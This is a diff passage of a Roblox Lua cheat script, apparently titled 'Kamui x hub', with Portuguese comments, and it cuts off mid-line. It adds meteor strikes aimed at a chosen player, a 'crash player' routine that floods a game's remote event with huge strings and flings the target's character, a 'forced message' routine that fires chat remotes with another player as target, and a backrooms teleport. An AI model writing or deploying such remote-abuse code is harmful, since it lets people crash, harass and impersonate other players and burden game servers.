+-- TAGS [USUÁRIO] / [ADMIN] (só visíveis para admins)
+-- ============================================================
+local function applyTag(player)
+    if not player or player == LocalPlayer then return end
+    if not isAdminAuthorized(LocalPlayer) then return end
+    if player:GetAttribute("KamuiHubUser") ~= true then return end
+    local char = player.Character
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+    local old = head:FindFirstChild("KamuiTag")
+    if old then old:Destroy() end
+    local isAdm = isAdminAuthorized(player)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "KamuiTag"
+    billboard.Size = UDim2.new(0, 120, 0, 25)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundColor3 = isAdm and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
+    label.BackgroundTransparency = 0.2
+    label.BorderSizePixel = 0
+    label.Text = isAdm and "[ADMIN]" or "[USUÁRIO]"
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextScaled = true
+    label.Font = Enum.Font.SourceSansBold
+    label.Parent = billboard
+end
+
+local function hookTags()
+    if not isAdminAuthorized(LocalPlayer) then return end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then applyTag(p) end
+    end
+    Players.PlayerAdded:Connect(function(p)
+        p.CharacterAdded:Connect(function() task.wait(1.5) applyTag(p) end)
+        task.wait(2)
+        applyTag(p)
+    end)
+end
+
+-- ============================================================
+-- METEOROS
+-- ============================================================
+local meteorRunning = false
+local function spawnMeteor(position)
+    local meteor = Instance.new("Part")
+    meteor.Name = "KamuiMeteor"
+    meteor.Shape = Enum.PartType.Ball
+    meteor.Size = Vector3.new(8, 8, 8)
+    meteor.Material = Enum.Material.Neon
+    meteor.BrickColor = BrickColor.new("Really red")
+    meteor.CanCollide = true
+    meteor.Position = Vector3.new(position.X + math.random(-200, 200), position.Y + 400, position.Z + math.random(-200, 200))
+    meteor.Parent = workspace
+    local fire = Instance.new("Fire")
+    fire.Heat = 50
+    fire.Size = 20
+    fire.Parent = meteor
+    local light = Instance.new("PointLight")
+    light.Brightness = 5
+    light.Range = 40
+    light.Color = Color3.fromRGB(255, 100, 0)
+    light.Parent = meteor
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new(math.random(-50, 50), -300, math.random(-50, 50))
+    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    bv.Parent = meteor
+    task.delay(8, function() if meteor and meteor.Parent then meteor:Destroy() end end)
+    meteor.Touched:Connect(function()
+        if meteor:GetAttribute("Exploded") then return end
+        meteor:SetAttribute("Exploded", true)
+        local explosion = Instance.new("Explosion")
+        explosion.Position = meteor.Position
+        explosion.BlastRadius = 20
+        explosion.BlastPressure = 50000
+        explosion.Parent = workspace
+        if meteor.Parent then meteor:Destroy() end
+    end)
+end
+
+local function startMeteor(target)
+    if meteorRunning then return end
+    meteorRunning = true
+    task.spawn(function()
+        while meteorRunning do
+            local pos
+            if target and target.Character then
+                local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then pos = hrp.Position end
+            end
+            if not pos then pos = Vector3.new(math.random(-300, 300), 100, math.random(-300, 300)) end
+            spawnMeteor(pos)
+            task.wait(0.5)
+        end
+    end)
+end
+
+local function stopMeteor()
+    meteorRunning = false
+    for _, obj in ipairs(workspace:GetChildren()) do
+        if obj.Name == "KamuiMeteor" then obj:Destroy() end
+    end
+end
+
+-- ============================================================
+-- CRASH PLAYER
+-- ============================================================
+local function crashPlayer(target)
+    if not target then return end
+    local RE = replicatedStorage:FindFirstChild("RE")
+    if not RE then return end
+    task.spawn(function()
+        for i = 1, 500 do
+            local r = RE:FindFirstChild("1Playe1rTrigge1rEven1t")
+            if r then pcall(function() r:FireServer(string.rep("A", 10000), target, string.rep("B", 10000)) end) end
+            if i % 50 == 0 then task.wait() end
+        end
+    end)
+    task.spawn(function()
+        for i = 1, 200 do
+            if target.Character then
+                local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then hrp.CFrame = CFrame.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)) end
+            end
+            task.wait(0.01)
+        end
+    end)
+end
+
+-- ============================================================
+-- MENSAGEM FORÇADA
+-- ============================================================
+local function forceMessage(target, message)
+    if not target or not message or message == "" then return end
+    local RE = replicatedStorage:FindFirstChild("RE")
+    if not RE then return end
+    for _, rn in ipairs({"1Cha1t", "1Cha1tEven1t", "1Se1ndMes1sage", "1Mes1sage", "1RPCha1t"}) do
+        local r = RE:FindFirstChild(rn)
+        if r then
+            pcall(function() r:FireServer(message, target) end)
+            pcall(function() r:FireServer(target, message) end)
+        end
+    end
+end
+
+-- ============================================================
+-- BACKROOMS
+-- ============================================================
+local function createBackrooms()
+    local existing = workspace:FindFirstChild("KamuiBackrooms")
+    if existing then existing:Destroy() end
+    local folder = Instance.new("Folder")
+    folder.Name = "KamuiBackrooms"
+    folder.Parent = workspace
+    local origin = Vector3.new(0, BACKROOMS_Y, 0)
+    local roomSize = 200
+    local wallHeight = 20
+    local floor = Instance.new("Part")
+    floor.Name = "Floor"
+    floor.Size = Vector3.new(roomSize, 2, roomSize)
+    floor.Position = origin
+    floor.Anchored = true
+    floor.BrickColor = BrickColor.new("New Yeller")
+    floor.Material = Enum.Material.Concrete
+    floor.Parent = folder
+    local ceiling = Instance.new("Part")
+    ceiling.Name = "Ceiling"
+    ceiling.Size = Vector3.new(roomSize, 2, roomSize)
+    ceiling.Position = origin + Vector3.new(0, wallHeight, 0)
+    ceiling.Anchored = true
+    ceiling.BrickColor = BrickColor.new("New Yeller")
+    ceiling.Material = Enum.Material.Concrete
+    ceiling.Parent = folder
+    for i, w in ipairs({
+        {Vector3.new(roomSize, wallHeight, 2), origin + Vector3.new(0, wallHeight/2, roomSize/2)},
+        {Vector3.new(roomSize, wallHeight, 2), origin + Vector3.new(0, wallHeight/2, -roomSize/2)},
+        {Vector3.new(2, wallHeight, roomSize), origin + Vector3.new(roomSize/2, wallHeight/2, 0)},
+        {Vector3.new(2, wallHeight, roomSize), origin + Vector3.new(-roomSize/2, wallHeight/2, 0)}
+    }) do
+        local wall = Instance.new("Part")
+        wall.Name = "Wall" .. i
+        wall.Size = w[1]
+        wall.Position = w[2]
+        wall.Anchored = true
+        wall.BrickColor = BrickColor.new("New Yeller")
+        wall.Material = Enum.Material.Concrete
+        wall.Parent = folder
+    end
+    for i = 1, 5 do
+        local lightPart = Instance.new("Part")
+        lightPart.Name = "Light" .. i
+        lightPart.Size = Vector3.new(8, 0.5, 2)
+        lightPart.Position = origin + Vector3.new(math.random(-80, 80), wallHeight - 1, math.random(-80, 80))
+        lightPart.Anchored = true
+        lightPart.CanCollide = false
+        lightPart.Material = Enum.Material.Neon
+        lightPart.BrickColor = BrickColor.new("Toothpaste")
+        lightPart.Parent = folder
+        local pl = Instance.new("PointLight")
+        pl.Brightness = 3
+        pl.Range = 80
+        pl.Color = Color3.fromRGB(255, 250, 200)
+        pl.Parent = lightPart
+    end
+end
+
+local function teleportToBackrooms(player)
+    if not player or not player.Character then return end
+    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then hrp.CFrame = CFrame.new(0, BACKROOMS_Y + 5, 0) end
+end
+
+-- ============================================================
+-- LANGUAGE SCREEN
+-- ============================================================
+local function createLanguageScreen()
+    local pg = LocalPlayer:WaitForChild("PlayerGui")
+    local old = pg:FindFirstChild("KamuiLanguageScreen")
+    if old then old:Destroy() end
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "KamuiLanguageScreen"
+    screen.Parent = pg
+    screen.ResetOnSpawn = false
+    screen.IgnoreGuiInset = true
+    local bg = Instance.new("Frame")
+    bg.Parent = screen
+    bg.AnchorPoint = Vector2.new(0.5, 0.5)
+    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.BorderSizePixel = 0
+    local title = Instance.new("TextLabel")
+    title.Parent = bg
+    title.AnchorPoint = Vector2.new(0.5, 0)
+    title.Position = UDim2.new(0.5, 0, 0.2, 0)
+    title.Size = UDim2.new(0.8, 0, 0.1, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "Kamui x hub (" .. VERSION .. ")"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextScaled = true
+    title.Font = Enum.Font.SourceSansBold
+    local pt = Instance.new("TextButton")
+    pt.Parent = bg
+    pt.AnchorPoint = Vector2.new(0.5, 0.5)
+    pt.Position = UDim2.new(0.35, 0, 0.5, 0)
+    pt.Size = UDim2.new(0.25, 0, 0.1, 0)
+    pt.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    pt.BorderSizePixel = 0
+    pt.Text = "Português"
+    pt.
